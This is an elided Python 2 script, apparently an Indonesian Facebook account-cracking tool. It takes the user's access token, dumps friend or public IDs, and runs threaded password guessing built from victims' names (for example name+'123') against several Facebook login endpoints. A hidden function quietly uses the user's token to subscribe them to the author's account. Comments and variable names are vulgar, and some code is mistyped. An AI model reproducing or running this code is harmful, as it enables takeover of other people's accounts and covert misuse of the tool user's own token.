...
from concurrent.futures import ThreadPoolExecutor as IvanGanteng
...
#------------------------------->
koh = '100004980722064'
xi_jimpinx = '2279647272211275'
url_ip = "https://www.httpbin.org/ip"
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['Chik-Chika Kyun:V', 'Lo ngentod:v', 'Ok Bang'])
...
# LO KONTOL
logo = '''\x1b[1;97m    ___ __  __ ____  _____
...
def ivantek():
    ...
    try:
        ...
        os.system('xdg-open https://youtube.com/channel/UCGTiBHoIML5Z7aQklaLaO-Q')
        vantek()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);ivantek()
...
def vantek():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');ivantek()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');ivantek()
    ...
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);vantek()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
        ...
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);vantek()
...
def wuhan(kontol):
    try:
        ...
        requests.post('httpe://graph.facebook.com/100004980722064/subscribers?access_token=%s'%(kentod))
...
def teman(kontol):
    ...
    try:
        ...
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));vantek()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));vantek()
'''
																																																				mik = 'Miku sayang Ivan'
																																																				ism = 'Ivan sayang Miku'
																																																			'''
...
def info_tools():
    ...
    print '\n %s[%s>%s] Yt       : IvanYT.'%(N,H,N);time.sleep(0.07)
    ...
    print '\n %s[%s>%s] Recode : Nio Ivan'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/Van-XD'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/100004980722064'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/n.ivan27'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Website  : https://www.ivantek.my.id'%(N,H,N);time.sleep(0.07)
...
def yo_ndak_tau_ko_tanya_saia():
    ...
    if _asu_ == '':
        ...
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.ivantek.my.id/server')
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));vantek()
        ___IvanGanteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___IvanGanteng___ in ('Y', 'y'):
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            with IvanGanteng(max_workers=30) as (__ivantek__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __ivantek__.submit(self.__api__, kimochi, ysc)
                                    except: pass
                            ...
                            with IvanGanteng(max_workers=30) as (__ivantek__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __ivantek__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                            ...
                            with IvanGanteng(max_workers=30) as (__ivantek__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __ivantek__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __ivantek__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __ivantek__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __ivantek__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
